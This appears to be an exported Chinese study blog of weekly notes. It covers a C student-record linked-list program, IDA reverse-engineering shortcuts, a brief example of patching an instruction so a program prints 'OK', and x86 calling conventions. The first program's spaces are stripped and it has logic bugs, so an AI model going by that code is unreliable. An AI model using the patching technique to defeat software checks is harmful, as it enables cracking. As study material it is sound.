<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">structstu&#123;</span><br><span class="line">	intnum;</span><br><span class="line">	charname[<span class="number">10</span>];</span><br><span class="line">	intsex;</span><br><span class="line">	intage;</span><br><span class="line">	intscore;</span><br><span class="line">	structstu*next;</span><br><span class="line">&#125;;</span><br><span class="line">structstu*p;</span><br><span class="line">voidmenu()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;choseafunction:\n&quot;</span></span><br><span class="line">	<span class="string">&quot;1.录入信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;2.打印信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;3.保存信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;4.读取信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;5.统计所有人数\n&quot;</span></span><br><span class="line">	<span class="string">&quot;6.按学号查找信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;7.修改信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;8.删除信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;9.退出\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">voidremove();</span><br><span class="line">voidbuild();</span><br><span class="line">voidprint(structstu*p);</span><br><span class="line">voidsum(structstu*p);</span><br><span class="line">voidsave(structstu*p);</span><br><span class="line">voidfind(structstu*p);</span><br><span class="line">voidmodify(structstu*p);</span><br><span class="line">voidread();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="keyword">switch</span>(n)&#123;</span><br><span class="line">			case9:</span><br><span class="line">				return0;</span><br><span class="line">			case1:<span class="comment">//录入</span></span><br><span class="line">				build();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case2:<span class="comment">//打印</span></span><br><span class="line">				print(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case3:<span class="comment">//保存</span></span><br><span class="line">				save(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case4:<span class="comment">//读取</span></span><br><span class="line">				read();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case5:<span class="comment">//统计人数</span></span><br><span class="line">				sum(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case6:<span class="comment">//查找</span></span><br><span class="line">				find(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case7:<span class="comment">//修改</span></span><br><span class="line">				modify(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case8:<span class="comment">//删除</span></span><br><span class="line">				remove();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Wrongnum\n&quot;</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidbuild()&#123;</span><br><span class="line">	structstu*head=<span class="literal">NULL</span>,*nextp;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		head=p;</span><br><span class="line">		<span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;顺序输入学号姓名性别（男1女0）年龄成绩输入-1结束\n&quot;</span>);</span><br><span class="line">	nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">	nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;num);</span><br><span class="line">	<span class="keyword">while</span>(nextp-&gt;num!=<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d%d&quot;</span>,nextp-&gt;name,&amp;nextp-&gt;sex,&amp;nextp-&gt;age,&amp;nextp-&gt;score);</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			head=p;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			head-&gt;next=nextp;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;num);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidprint(structstu*p)&#123;</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d%s%d%d%d\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidsum(structstu*p)&#123;</span><br><span class="line">	inti=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidfind(structstu*p)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入学号：&quot;</span>);</span><br><span class="line">	intnum;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;num==num)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d%s%d%d%d\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WrongNumber\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidmodify(structstu*p)&#123;</span><br><span class="line">	structstu*head;</span><br><span class="line">	head=p;</span><br><span class="line">	intnum;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入修改学生的学号:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	<span class="keyword">while</span>(head)&#123;</span><br><span class="line">		<span class="keyword">if</span>(head-&gt;num!=num)&#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;学号错误&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入修改学生的信息:\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;顺序输入姓名性别（男1女0）年龄成绩输入:\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d%d&quot;</span>,head-&gt;name,&amp;head-&gt;sex,&amp;head-&gt;age,&amp;head-&gt;score);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功修改\n&quot;</span>);</span><br><span class="line">		print(p);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidremove()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入删除的学生学号：&quot;</span>);</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	structstu*head,*nextp,*d;</span><br><span class="line">	head=p;</span><br><span class="line">	nextp=p;</span><br><span class="line">	d=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;num==n)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(head);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		head=head-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(head)&#123;</span><br><span class="line">			<span class="keyword">if</span>(n!=head-&gt;num)&#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;学号错误&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidsave(structstu*p)&#123;</span><br><span class="line">	FILE*fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\stuinfo.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d%s%d%d%d\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;数据保存成功。\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">voidread()&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		structstu*nextp=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp)&#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FILE*fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\stuinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件无法打开&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		structstu*nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;num)==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;sex);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;age);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;score);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.02-2020.03.08</title>
    <url>/2f00783a.html</url>
    <content><![CDATA[<h1>IDA</h1>
<h2 id="四个快捷键">四个快捷键</h2>
<p>添加注释：冒号或分号<br>
跳转到某个地址（16进制）：‘G’;返回（后退）：‘Esc’;前进：‘Ctrl+Enter’</p>
<h2 id="交叉参考">交叉参考</h2>
<p>可以知道指令代码相互调用的关系<br>
<img src="https://s2.ax1x.com/2020/03/02/3RV2Ox.md.png" alt=" "><br>
'↑j’中j表示跳转，o表示偏移量，p表示子程序，双击或按回车可以跳到调用该处的地方<br>
在‘loc_xxxxx’上按’x’打开交叉参考窗口</p>
<span id="more"></span>
<h2 id="参考重命名">参考重命名</h2>
<p>可把所有 loc_xxxxxx 重命名<br>
<img src="https://s2.ax1x.com/2020/03/02/3Ru4WF.png" alt=" "></p>
<h2 id="标签">标签</h2>
<p>打开标记当前位置功能：‘jump’-&gt;‘mark position’  快捷键:‘Alt+M’<br>
标记后在其他位置可以跳转到标记时光标的位置，快捷键：‘Ctrl+M’</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TRn9e.png" alt=" "><br>
<img src="https://s2.ax1x.com/2020/03/05/3TRVAK.png" alt=" "></p>
<h2 id="格式化指令操作数">格式化指令操作数</h2>
<p>把常量转换为十六、十、八、二进制<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRehD.png" alt=" "></p>
<h2 id="函数的操作">函数的操作</h2>
<h2 id="代码和数据转换">代码和数据转换</h2>
<p>IDA可能无法正确区分数据字节和代码字节，有些程序利用这一点对抗静态反汇编<br>
用户可以将某段数据指定为代码或数据<br>
方法：‘Edit’-&gt;‘Code’/‘Data’(快捷键’C’/‘D’)，'D’会将数据类型在db，dw，dd之间转换<br>
按’U’取消定义后得到一些可以重新定义的字节，按’P’将某段代码定义为子程序<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRZtO.png" alt=" "><br>
—&gt;<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRk0x.md.png" alt="按'c'结果如图"></p>
<h2 id="字符串">字符串</h2>
<p>编程语言的不同造成字符串格式不同<br>
c语言字符串以0结尾，dos字符串以$结尾,其他可见于’Edit’-&gt;‘string’<br>
<img src="https://s2.ax1x.com/2020/03/05/3T7bP1.png" alt="3T7bP1.png"><br>
按’A’生成一个变量名，按’U’恢复，在’View’-&gt;‘Open subviews’-&gt;'Names’可以看到字符串变量</p>
<h2 id="数组">数组</h2>
<p>可以将数据按数组的形式显示<br>
<img src="https://s2.ax1x.com/2020/03/06/3bDXcR.png" alt="未识别的数组"><br>
‘Edit’-&gt;‘Array’或’ * '打开数组排列调整窗口<br>
<img src="https://s2.ax1x.com/2020/03/06/3b6yKs.png" alt="调整数组大小、每行项数（0自动调整）、对齐方式（0自动调整）"><br>
<img src="https://s2.ax1x.com/2020/03/06/3bDO39.png" alt="设置为'3 0 -1'的结果"></p>
<h2 id="结构体">结构体</h2>
<p>对一些常见的文件类型，IDA会自动加载相应的类型库，这些类型库中有相应的结构体。<br>
‘Shift+F11’打开加载类型库窗口（Loaded Type Libarries)，右键’Load Type Libarary’，'Insert’添加类型库</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*******************************************************</span></span><br><span class="line"><span class="comment">*程序:Structures.cpp                                                                                      *</span></span><br><span class="line"><span class="comment">*用途:IDA结构体反汇编                                                                        *</span></span><br><span class="line"><span class="comment">*   看雪软件安全网站                                                                              *   </span></span><br><span class="line"><span class="comment">*    www.pediy.com, kanxue 2002.8                                                                 *</span></span><br><span class="line"><span class="comment">********************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">	&#123;</span><span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[2]=</span>&#123;&#123;<span class="number">01</span>,<span class="string">&quot;Mary&quot;</span>,<span class="number">14</span>&#125;,&#123;<span class="number">02</span>,<span class="string">&quot;Angela&quot;</span>,<span class="number">15</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">for</span>(p=stu;p&lt;stu+<span class="number">2</span>;p++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d  %-20s%4d\n&quot;</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2020/03/06/3LK7fU.png" alt="对应了main()里的内容，结构体存在“unk_407030”那块"></p>
<p><img src="https://s2.ax1x.com/2020/03/06/3Lu7Md.md.png" alt="没有定义结构体时自动生成"><br>
如[esi+18h]调用了结构体中的数据，可用有意义的名字代替<br>
先把结构体数据中的数据重新定义<br>
<img src="https://s2.ax1x.com/2020/03/06/3LQWaq.md.png" alt="参考数组、字符串、数据类型"><br>
打开结构体窗口，insert一个结构类型。按’d’添加数据/切换数据类型，按’a’切换为字符串，按’n’修改结构体成员的名字<br>
<img src="https://s2.ax1x.com/2020/03/07/3OW2SP.png" alt=" "><br>
将光标定位在相应地址处，'Edit-&gt;‘Struct var’选择相应结构体类型<br>
<img src="https://s2.ax1x.com/2020/03/07/3OfiSx.png" alt="调整后"><br>
按’T’，在操作数类型中重新定义现有数据：<br>
<img src="https://s2.ax1x.com/2020/03/07/3OzPyD.png" alt=" "><br>
选择一片代码后可以批量进行替换：<br>
<img src="https://s2.ax1x.com/2020/03/07/3X9BnS.png" alt=""><br>
<em>lea：</em><br>
<em>lea bx，data</em><br>
<em>lea是load effective address 的缩写，是取源操作数的偏移地址，并将其传送到目的操作数单元。类似于C语言的取地址符&amp;。</em><br>
<em>lea eax,[eax+2</em>eax]的效果是eax = eax + eax * 2*<br>
<em>mov edx,[ebp+16]的效果是edx=(dword)(ebp+16).</em></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.08-2020.03.15</title>
    <url>/232092d7.html</url>
    <content><![CDATA[<h1>IDA</h1>
<h2 id="枚举">枚举</h2>
<p>‘View’-&gt;‘Open subviews’-&gt;‘Enumerations’ 打开枚举窗口，按’Insert’插入新的枚举类型，按’N’添加成员<br>
选中需要重新定义的数据，按’M’后将其转换<br>
<img src="https://s1.ax1x.com/2020/03/12/8etGNT.md.png" alt="8etGNT.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/12/8etJ4U.md.png" alt="8etJ4U.md.png"></p>
<span id="more"></span>
<h2 id="FLIRT">FLIRT</h2>
<p>库文件快速识别与鉴定技术<br>
在一系列编译器的标准库文件里自动找出调用的函数，如，把’call 406E40’识别为’call strlen’<br>
如果没有自动识别出来，可以强制使用编译器特征文件（xxxx.sig）<br>
‘View’-&gt;‘Open subviews’-&gt;'Signatures’或’Shift+F5’打开签名窗口，右键’Apply new signature’选择签名文件</p>
<h2 id="（不知道把这部分叫作啥）">（不知道把这部分叫作啥）</h2>
<ol>
<li></li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/12/8eOmin.md.png" alt="可见，可以把004010c9的内容改了让程序显示'OK'"></p>
<p><img src="https://s1.ax1x.com/2020/03/14/8lFm6K.png" alt="Assmeble修改汇编指令，Apply patches to input file...将修改保存到文件"><br>
2.<br>
输入输出等函数可在name窗口中查看</p>
<h1>32位软件逆向技术</h1>
<h2 id="启动函数">启动函数</h2>
<p>Windows程序执行并不是由WinMain函数开始的，首先执行的是启动函数的相关代码（由编译器生成），完成后才调用WinMain函数</p>
<p>c/c++程序的启动函数作用基本相同，包括 检索指向新进程的<u>命令行</u>指针、检索指向新进程的<u>环境变量</u>指针、全局变量初始化和内存栈初始化等</p>
<p><img src="https://s1.ax1x.com/2020/03/12/8maVFP.md.png" alt="某程序启动代码（部分）"><br>
分析程序的过程中可以略过启动代码，直接将重点放到WinMain函数上</p>
<h2 id="函数">函数</h2>
<p>通过call…ret把函数调用和其他跳转指令区别开<br>
直接调用：call <u>函数首地址</u><br>
间接调用：call [<u> eax </u>] (通过寄存器传递函数地址或动态计算函数地址)</p>
<h3 id="函数的参数">函数的参数</h3>
<p>函数传递参数有3种方式：栈方式、寄存器方式、通过全局变量进行隐含参数传递方式<br>
每一种机制与使用的编译语言有关</p>
<h4 id="利用栈传递参数">利用栈传递参数</h4>
<p>函数计算结束后，由调用者或函数本身修改栈，使栈恢复原样（<strong>平衡栈数据</strong>）<br>
调用约定：为了实现函数调用而建立的协议（按照什么顺序入栈；由谁来平衡栈…）</p>
<ol>
<li>c规范(__cdecl)函数按照从右到左的顺序入栈，由调用者负责清除栈（c/c++/mfc(微软基础类库)默认调用约定）</li>
<li>stdcall调用约定按照从右到左传递参数，并由调用的函数在返回前清理传送参数的内存栈</li>
<li>stdcall调用约定是Win32 API采用的约定方式，在Win32 API种也有一些函数采用(__cdecl)调用，如wsprintf</li>
</ol>
<p>c、c++、pascal 等高级语言的子程序执行过程基本相似：</p>
<ol>
<li>调用者将函数执行完毕时应返回的地址和参数压入栈</li>
<li>子程序通过’ebp 指针+偏移量’对栈中的操作进行寻址</li>
<li>子程序使用ret或retf返回，此时cpu将eip置为栈中保存的地址</li>
</ol>
<p>栈的操作对象只能是双操作数（占4个字节）<br>
<img src="https://s1.ax1x.com/2020/03/14/8lP1De.md.png" alt="一个凑行数的图"></p>
<p>用ebp存取栈<br>
用ret平衡栈时，在ret指令后加一个操作数，表示在ret指令后给esp加上操作数  如’ret 8’相当于在返回后将esp+8，ret后面的值等于参数个数*4h</p>
<p>enter 和 leave指令可以帮助进行栈的维护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enter xxxx,0   ;0表示创建xxxx大小的空间来放置局部变量</span><br><span class="line">....</span><br><span class="line">leave </span><br><span class="line">ret 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter的作用为：</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,xxxx</span><br><span class="line"></span><br><span class="line">leave的作用为：</span><br><span class="line">add esp,xxxx</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ENTER 有两个操作数：第一个是常数，定义为局部变量保存的堆栈空间字节数；第二个定义了过程的词法嵌套级。<br>
ENTER numbytes, nestinglevel<br>
Numbytes 总是向上舍入为 4 的倍数，以便 ESP 对齐双字边界。Nestinglevel 确定了从主调过程堆栈帧复制到当前帧的堆栈帧指针的个数。</p>
</blockquote>
<h4 id="利用寄存器传递参数">利用寄存器传递参数</h4>
<p>绝大多数编译器都遵循fastcall规范<br>
不同的编译器实现的fastcall稍有不同</p>
<h4 id="名称修饰约定">名称修饰约定</h4>
<p>c++编译器会按照某种规则改写每一个入口点的符号名，从而允许同一个名字有多个用法且不破坏链接器。这种技术称为名称改编或名称修饰<br>
在vc++种，函数修饰名由编译类型(c/c++)、函数名、类（class）名、调用约定、返回类型等决定<br>
<img src="https://s1.ax1x.com/2020/03/15/83ZkQA.png" alt="常见的c和c++编译函数名的修饰"></p>
<h3 id="函数的返回值">函数的返回值</h3>
<p>最常见的是return操作符，还有通过参数 按 传引用方式 返回值、通过全局变量返回值</p>
<h4 id="用return操作符返回值">用return操作符返回值</h4>
<p>一般情况下返回值放在eax中，如果超过大小，高32位就会放在edx<br>
对于一个返回两个参数和的子函数：<br>
<img src="https://s1.ax1x.com/2020/03/15/83eB4S.png" alt="圈起来的即为存放返回值的过程"><br>
对应c语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    temp=x+y;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="通过参数按传引用方式返回值">通过参数按传引用方式返回值</h3>
<p>传递参数的方式有：传值和传引用<br>
传值调用时会建立参数的一份复本，并把它传给调用参数<br>
传引用允许调用函数修改原始变量的值（指针）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*a&lt;*b)</span><br><span class="line">        *a=*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/15/83uRHI.png" alt=" "></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.17-2020.02.23</title>
    <url>/12995.html</url>
    <content><![CDATA[<h1>洛谷</h1>
<h2 id="函数整理">函数整理</h2>
<h3 id="memset">memset</h3>
<p>memset(数组名或指针，值，大小)<br>
可用于数组初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="sprintf">sprintf</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...]);  </span><br></pre></td></tr></table></figure>
<p>str为要写入的字符串；format为格式化字符串，与printf()函数相同；argument为变量。<br>
可用于把整数搞进字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%8x&quot;</span>, <span class="number">4567</span>);  <span class="comment">//小写16进制，宽度占8个位置，右对齐，保存在s中</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;The ASCII code of a is %d.&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>sprintf不检测数组长度，容易造成缓冲区溢出，可用snprintf()代替</p>
<h2 id="题">题</h2>
<h3 id="P1031-均分纸牌">P1031 均分纸牌</h3>
<p><img src="https://s2.ax1x.com/2020/02/23/3llMYn.md.png" alt=" "></p>
<p> <br>
没啥思路就看了题解:<br>
<img src="https://s2.ax1x.com/2020/02/23/3llnoj.png" alt=""><br>
